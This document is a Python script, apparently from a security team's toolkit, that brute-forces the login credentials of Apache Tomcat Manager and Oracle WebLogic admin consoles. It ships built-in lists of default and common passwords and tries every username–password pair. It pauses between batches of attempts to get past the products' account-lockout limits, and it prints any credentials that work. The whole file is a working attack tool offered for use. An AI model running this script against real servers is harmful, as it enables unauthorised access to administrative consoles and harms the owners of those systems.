#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# author: zhzyker
# copyright: Zero Security Team
import time
import requests
import argparse
from requests.compat import urljoin
import sys
import base64
from loguru import logger

yellow = '\033[01;33m'
green = '\033[01;32m'
white = '\033[01;37m'
blue = '\033[01;34m'
red = '\033[1;31m'
end = '\033[0m'
banner = f'''{blue} ____  {red}____  {blue}____  _____       {green}___  {red}____    {blue}__    ___  _  _ 
{blue}(_   ){red}( ___){blue}(  _ \(  _  ){yellow}___  {green}/ __){red}(  _ \  {blue}/__\  / __)( )/ ) 
{blue} / /_  {red})__){blue}  )   / )(_)({yellow}(___){green}( (__  {red})   / {blue}/(__)\( (__  )  ( 
{blue}(____){red}(____){blue}(_)\_)(_____)     {green}\___){red}(_)\_){blue}(__)(__)\___)(_)\_)

          {white}{'{zero-crack #0.1}'} by {blue}Z{red}e{blue}ro S{red}e{blue}curity Team
               {white}welcome https://www.0-sec.org{end}
'''
print(banner)


def arg():
    parser = argparse.ArgumentParser(usage="python3 zero-crack [options]", add_help=False)
    ge = parser.add_argument_group("general", "general options")
    ge.add_argument("-u", "--url", dest="url", type=str, help=" target URL (e.g. -u \"http://example.com\")")
    ge.add_argument("-a", dest="app", type=str, help="specify apps (e.g. -a \"tomcat\")")
    ge.add_argument("-l", dest="username", type=str, nargs='+', help="username (e.g. -l \"admin\")")
    ge.add_argument("-L", dest="userlist", help="username file (e.g. -L \"user.txt\")")
    ge.add_argument("-p", dest="password", type=str, nargs='+', help="password (e.g. -l \"admin\")")
    ge.add_argument("-P", dest="passlist", help="passowrd file (e.g. -P \"pass.txt\")")
    ge.add_argument("--delay", dest="delay", type=int, default=0, help="delay time, default 0s")
    ge.add_argument("-h", "--help", action="help", help="show this help message and exit")
    support = parser.add_argument_group("support apps")
    support.add_argument(action='store_false', dest="types of support:\n  "
                         "tomcat, weblogic")
    example = parser.add_argument_group("examples")
    example.add_argument(action='store_false',
                         dest="python3 zero-crack.py -u http://example.com -a tomcat\n  "
                              "python3 zero-crack.py -u http://example.com -a tomcat -L user.txt -P pass.txt\n  ")
    return parser.parse_args()


stdout_fmt = '<cyan>{time:HH:mm:ss}</cyan> ' \
             '[<level>{level: <5}</level>] ' \
             '<blue>{module}</blue>:<cyan>{line}</cyan> - ' \
             '<level>{message}</level>'
logger.remove()
logger.level(name='TRACE', color='<cyan><bold>', icon='✏️')
logger.level(name='DEBUG', color='<blue><bold>', icon='🐞 ')
logger.level(name='INFOR', no=20, color='<blue><bold>', icon='ℹ️')
logger.level(name='QUITE', no=25, color='<green><bold>', icon='🤫 ')
logger.level(name='ALERT', no=30, color='<yellow><bold>', icon='⚠️')
logger.level(name='ERROR', color='<red><bold>', icon='❌️')
logger.level(name='FATAL', no=50, color='<RED><bold>', icon='☠️')
logger.add(sys.stderr, level='INFOR', format=stdout_fmt, enqueue=True)


username_weblogic = ['weblogic', 'admin']
password_weblogic = ['weblogic', 'Oracle@123', 'welcome1', 'weblogic123', 'weblogic@123', 'weblogic10', 'WebLogic',
                     'password', 'system', 'Administrator', 'admin', 'security', 'joe', 'wlcsystem', 'wlpisystem',
                     'Weblogic123!', 'Weblogic@!2016', 'Weblogic@!2017', 'Weblogic_123', 'weblogic8', 'weblogic9',
                     'weblogic10', 'weblogic11', 'welcome', 'Oracle123', 'Oracle!123', 'Oracle', '1qaz@WSX',
                     'weblogic12', '123@123']
username_tomcat = ['tomcat', 'admin', 'role1', 'both', 'manager', 'root', 'administrator', 'super', 'web', 'test',
                   'guest']
password_tomcat = ['tomcat', 'password', 'admin', 's3cret', '123456', 'role1', 'changethis', 'r00t', 'toor',
                   'user', 'Passw0rd', '123', '12345', '1q2w3e4r', '1qaz2wsx', 'qazwsx', '123qwe', '123qaz',
                   '1234567', 'password123', '12345678', '123456qwerty', '123456789', 'q1w2e3r4', '123@123',
                   'Password1', 'password1']

username_public = ['admin', 'weblogic', 'tomcat']
password_public = ['weblogic', 'tomcat', 'weblogic123', 'Oracle@123', '123456', 'role1', 'changethis', 's3cret']
username_null = []
password_null = []


def conn_timeout(url):
    logger.log('ERROR', 'Connection timeout for ' + url)


def conn_failed(url):
    logger.log('ERROR', 'Connection failed for ' + url)


class Weblogic:
    def __init__(self, url):
        self.url = url
    def check(self):
        self.admin_url = urljoin(self.url, "/console/j_security_check")
        try:
            resp = requests.get(self.admin_url)
            if r'name="j_password"' in resp.text and r'id="j_password"' in resp.text:
                logger.log('ALERT', 'Find Weblogic console is ' + self.admin_url)
                logger.log('ALERT', 'Within 5 minutes >= 5 login failure account locked for 30 minutes')
                return True
        except requests.exceptions.Timeout:
            conn_timeout(self.url)
        except requests.exceptions.ConnectionError:
            conn_failed(self.url)

    def crack(self, username, password):
        data = {
            'j_username': username,
            'j_password': password,
            'j_character_encoding': 'UTF-8',
        }
        resp = requests.post(self.admin_url, data)
        if r'name="j_password"' not in resp.text:
            return True


class Tomcat:
    def __init__(self, url):
        self.url = url
    def check(self):
        self.admin_url = urljoin(self.url, "/manager/html")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
            'Connection': 'close'
        }
        try:
            resp = requests.get(self.admin_url, headers=headers)
            if resp.status_code == 401 and r"manager-gui" in resp.text:
                logger.log('ALERT', 'Apache Tomcat Manager is ' + self.admin_url)
                logger.log('ALERT', 'Tomcat manager default to some account login failure >=5 account locked for 300s')
                return True
        except requests.exceptions.Timeout:
            conn_timeout(self.url)
        except requests.exceptions.ConnectionError:
            conn_failed(self.url)

    def crack(self, username, password):

        u_p = base64.b64encode(str.encode(username + ":" + password))
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
            'Connection': 'close',
            'Authorization': 'Basic ' + u_p.decode('utf-8')
        }
        resp = requests.get(self.admin_url, headers=headers)
        if resp.status_code == 200 and r"Apache Software Foundation" in resp.text:
            return True


def crack(args):
    username = None
    password = None
    url = args.url
    app = args.app
    file_user = args.userlist
    file_pass = args.passlist
    if not app:
        logger.log('ERROR', 'Application must be specified (e.g. -a tomcat)')

    if args.username:
        username = args.username
    if args.password:
        password = args.password

    tomcat = Tomcat(url)
    weblogic = Weblogic(url)

    u_lock = False
    p_lock = False
    if file_user:
        u_lock = True
        try:
            with open(file_user, 'r') as username:
                logger.log('ALERT', 'Use username dictionary: ' + file_pass)
                for line in username:
                    line = line.strip()
                    username_null.append(line)
            username = username_null
        except FileNotFoundError:
            logger.log('FATAL', 'Can\'t find username dictionary: ' + file_pass)
            exit(0)
    if file_pass:
        p_lock = True
        try:
            with open(file_pass, 'r') as password:
                logger.log('ALERT', 'Use password dictionary: ' + file_pass)
                for line in password:
                    line = line.strip()
                    password_null.append(line)
            password = password_null
        except FileNotFoundError:
            logger.log('FATAL', 'Can\'t find password dictionary: ' + file_pass)
            exit(0)
    if app == 'tomcat':
        if not u_lock and not username:
            username = username_tomcat
        if not p_lock and not password:
            password = password_tomcat
        if not tomcat.check():
            exit(0)
    elif app == 'weblogic':
        if not u_lock and not username:
            username = username_weblogic
        if not p_lock and not password:
            password = password_weblogic
        if not weblogic.check():
            exit(0)
    else:
        logger.log('ERROR', 'The app is not supported')
        exit(0)
    crack_result = []
    logger.log('ALERT', 'Loading crack dictionary')
    count = 0
    num = 1
    total = len(username) * len(password)
    for u in username:
        for p in password:
            time.sleep(args.delay)
            count += 1
            rate = '{:.2%}'.format(count / total) + ' ' + str(count) + "/" + str(total)
            if app == 'tomcat':
                if count == 5 * num + 1:
                    num += 1
                    time.sleep(300)
                if tomcat.crack(u, p):
                    logger.log('QUITE', rate + ' Finding: ' + u + ':' + p)
                    crack_result.append(u + ':' + p)
                else:
                    logger.log('INFOR', rate + ' Testing: ' + u + ':' + p)
            if app == 'weblogic':
                if count == 4 * num + 1:
                    num += 1
                    time.sleep(300)
                if weblogic.crack(u, p):
                    logger.log('QUITE', rate + ' Finding: ' + u + ':' + p)
                    crack_result.append(u + ':' + p)
                else:
                    logger.log('INFOR', rate + ' Testing: ' + u + ':' + p)

    logger.log('ALERT', 'Bruteforce finished')
    if crack_result:
        logger.log('ALERT', str(len(crack_result)) + ' result found')
        for r in crack_result:
            logger.log('QUITE', 'Successful result: ' + r)
    else:
        logger.log('ERROR', 'No valid credentials were found')


if __name__ == '__main__':
    args = arg()
    crack(args)
